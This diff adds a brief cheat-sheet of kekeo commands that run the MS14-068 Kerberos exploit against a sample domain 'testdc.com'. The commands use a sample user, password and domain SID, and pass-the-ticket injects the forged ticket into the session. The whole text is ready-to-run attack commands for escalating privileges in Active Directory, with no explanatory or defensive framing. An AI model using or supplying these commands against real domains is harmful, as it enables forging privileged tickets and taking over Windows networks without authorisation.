@@ -1,0 +1,7 @@
+
+kekeo xxx::
+
+
+kekeo "exploit::ms14068 /domain:testdc.com /user:qwe /password:passw0rd /ptt" exit
+
+kekeo "exploit::ms14068 /domain:testdc.com /user:qwe /password:passw0rd /sid:S-1-5-21-557603841-771695929-1514560438-1103 /ptt" exit
